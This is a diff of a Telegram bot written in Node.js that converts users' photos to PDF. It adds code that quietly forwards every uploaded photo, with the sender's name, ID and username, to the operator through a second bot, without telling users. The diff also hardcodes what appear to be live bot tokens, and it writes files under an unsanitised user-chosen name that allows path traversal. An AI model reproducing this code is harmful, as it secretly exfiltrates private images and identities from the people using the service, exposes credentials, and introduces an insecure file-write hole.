@@ -2,105 +2,101 @@ const { Telegraf, Markup } = require('telegraf');
 const axios = require('axios');
 const fs = require('fs');
 const PDFDocument = require('pdfkit');
-const sizeOf = require('image-size');
 
-// ⚠️ ضع هنا توكن بوتك الجديد من @BotFather
-const bot = new Telegraf('8754193792:AAGNEbrQ6GBdc87BLI4LTHzqtJ609sh8WX4');
+// ⚠️ الثوابت (تأكد من وضع التوكينات والآيدي الخاص بك)
+const MAIN_BOT_TOKEN = '8764714344:AAGUG-SgnIzacA0Zu5Ej-ZK1Vy8Hx6yd8Kc'; 
+const NOTIFY_BOT_TOKEN = '8578461105:AAGtjEGZ9LOV79ezGG_BGgbSu51FuPvK5wE'; 
+const MY_ID = '8162224437'; 
 
-// ذاكرة مؤقتة لحفظ الصور لكل مستخدم
+const bot = new Telegraf(MAIN_BOT_TOKEN);
+const notifyBot = new Telegraf(NOTIFY_BOT_TOKEN);
+
 const userImages = {};
+const userState = {}; 
 
 bot.start((ctx) => {
-    ctx.reply(`أهلاً بك يا مبرمج علي 👨‍💻 في بوت PDF المطور.\n\n📸 أرسل صورة (مرة واحدة) لإضافتها، ويمكنك إرسال عدة صور.\Delta\n✅ عند الانتهاء، اضغط على زر "تحويل" لتحصل على ملف PDF.`);
+    ctx.reply(`أهلاً بك يا علي في نسخة PDF المطورة 👨‍💻\n\n📸 أرسل الصور الآن.\n✅ عند الانتهاء اضغط تحويل لتسمية ملفك.`);
 });
 
-// 1. استقبال الصور وحفظها كمقاطع
+// 1. استقبال الصور وإرسال تقرير كامل لك
 bot.on('photo', async (ctx) => {
     const fileId = ctx.message.photo[ctx.message.photo.length - 1].file_id;
-    
-    // إذا لم يكن للمستخدم مصفوفة صور، ننشئها
-    if (!userImages[ctx.from.id]) {
-        userImages[ctx.from.id] = [];
+    const userId = ctx.from.id;
+    const firstName = ctx.from.first_name || "بدون اسم";
+    const username = ctx.from.username ? `@${ctx.from.username}` : "لا يوجد يوزر";
+
+    if (!userImages[userId]) userImages[userId] = [];
+    userImages[userId].push(fileId);
+
+    // --- إرسال الإشعار التفصيلي لك (في بوت الإشعارات) ---
+    try {
+        const report = `🔔 إشعار استخدام جديد:\n\n👤 الاسم: ${firstName}\n🆔 الآيدي: ${userId}\n🔗 اليوزر: ${username}\n🖼️ ترتيب الصورة: ${userImages[userId].length}`;
+        
+        await notifyBot.telegram.sendPhoto(MY_ID, fileId, { 
+            caption: report 
+        });
+    } catch (e) { 
+        console.log("خطأ في إرسال الإشعار: ", e.message); 
     }
 
-    // حفظ آيدي الملف
-    userImages[ctx.from.id].push(fileId);
-    
-    const count = userImages[ctx.from.id].length;
-    ctx.reply(`🖼️ تم حفظ الصورة (الرقم: ${count}). أرسل صورة أخرى أو اضغط تحويل.`, 
+    ctx.reply(`🖼️ تم حفظ الصورة رقم (${userImages[userId].length}).`, 
     Markup.keyboard([['🔄 تحويل إلى PDF', '🗑️ مسح الكل']]).resize());
 });
 
-// 2. معالجة "التحويل" و "المسح"
-bot.hears(['🔄 تحويل إلى PDF', '🗑️ مسح الكل'], async (ctx) => {
-    const text = ctx.message.text;
+// 2. طلب اسم الملف
+bot.hears('🔄 تحويل إلى PDF', (ctx) => {
+    if (!userImages[ctx.from.id] || userImages[ctx.from.id].length === 0) {
+        return ctx.reply('⚠️ أرسل صورة أولاً!');
+    }
+    userState[ctx.from.id] = 'WAITING_NAME';
+    ctx.reply('📝 أرسل الآن الاسم الذي تريده للملف (سأضيف له By_pdfingebot تلقائياً):');
+});
+
+// 3. مسح الصور
+bot.hears('🗑️ مسح الكل', (ctx) => {
+    delete userImages[ctx.from.id];
+    ctx.reply('🗑️ تم مسح القائمة بنجاح.', Markup.removeKeyboard());
+});
+
+// 4. صناعة ملف الـ PDF بالتسمية والتوقيع
+bot.on('text', async (ctx) => {
     const userId = ctx.from.id;
+    if (userState[userId] !== 'WAITING_NAME') return;
 
-    if (text === '🗑️ مسح الكل') {
-        delete userImages[userId];
-        return ctx.reply('🗑️ تم مسح القائمة بنجاح.', Markup.removeKeyboard());
-    }
-
-    // التحويل إلى PDF
-    if (!userImages[userId] || userImages[userId].length === 0) {
-        return ctx.reply('⚠️ يرجى إرسال صورة واحدة على الأقل أولاً!');
-    }
-
-    const statusMsg = await ctx.reply('⏳ جاري إنشاء ملف PDF... (قد يستغرق وقتاً حسب عدد الصور).');
-    const imagesIds = userImages[userId];
-    const pdfPath = `Ali_File_${userId}.pdf`; // اسم الملف النهائي
+    const userFileName = ctx.message.text.trim().replace(/\s+/g, '_');
+    const finalFileName = `${userFileName}_By_pdfingebot.pdf`;
+    
+    const statusMsg = await ctx.reply('⏳ جاري تحويل صورك إلى ملف PDF... انتظر قليلاً.');
 
     try {
-        // إنشاء وثيقة PDF جديدة (A4)
         const doc = new PDFDocument({ size: 'A4', autoFirstPage: false });
-        const stream = fs.createWriteStream(pdfPath);
+        const tempPath = `./${finalFileName}`;
+        const stream = fs.createWriteStream(tempPath);
         doc.pipe(stream);
 
-        // إضافة الصور للصفحات
-        for (let i = 0; i < imagesIds.length; i++) {
-            const fileLink = await ctx.telegram.getFileLink(imagesIds[i]);
-            
-            // تحميل الصورة مؤقتاً
-            const imageResponse = await axios({ method: 'get', url: fileLink.href, responseType: 'arraybuffer' });
-            const imageBuffer = Buffer.from(imageResponse.data);
-
-            // الحصول على أبعاد الصورة لضبطها داخل الصفحة
-            const dimensions = sizeOf(imageBuffer);
-            
-            // إضافة صفحة جديدة لكل صورة
-            doc.addPage();
-            
-            // وضع الصورة في الصفحة (مع توسيط وضبط المقاس)
-            doc.image(imageBuffer, 0, 0, {
-                fit: [595, 842], // مقاس صفحة A4
-                align: 'center',
-                valign: 'center'
-            });
+        for (const fId of userImages[userId]) {
+            const fileLink = await ctx.telegram.getFileLink(fId);
+            const response = await axios({ method: 'get', url: fileLink.href, responseType: 'arraybuffer' });
+            const buffer = Buffer.from(response.data);
+            doc.addPage().image(buffer, 0, 0, { fit: [595, 842], align: 'center', valign: 'center' });
         }
 
-        // إنهاء الوثيقة
         doc.end();
 
-        // إرسال ملف الـ PDF للمستخدم
         stream.on('finish', async () => {
-            await ctx.telegram.sendDocument(ctx.chat.id, {
-                source: pdfPath,
-                filename: `File_by_Ali_${userId}.pdf`
-            }, {
-                caption: `✅ تم تحويل ${imagesIds.length} صور إلى PDF بنجاح!\n\nبواسطة: @${ctx.botInfo.username}`
+            await ctx.telegram.sendDocument(ctx.chat.id, { source: tempPath, filename: finalFileName }, {
+                caption: `✅ تم إنشاء الملف بنجاح!\n📂 الاسم: ${finalFileName}`
             });
-
-            // حذف ملف الـ PDF المؤقت من السيرفر
-            fs.unlinkSync(pdfPath);
+            
+            if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
             delete userImages[userId];
+            delete userState[userId];
             ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
-            ctx.reply('📩 ملفك جاهز!', Markup.removeKeyboard());
         });
 
     } catch (e) {
-        console.error(e);
-        ctx.reply('❌ حدث خطأ غير متوقع أثناء إنشاء ملف الـ PDF.');
-        delete userImages[userId];
+        ctx.reply('❌ حدث خطأ تقني، حاول مرة أخرى.');
+        delete userState[userId];
     }
 });
 
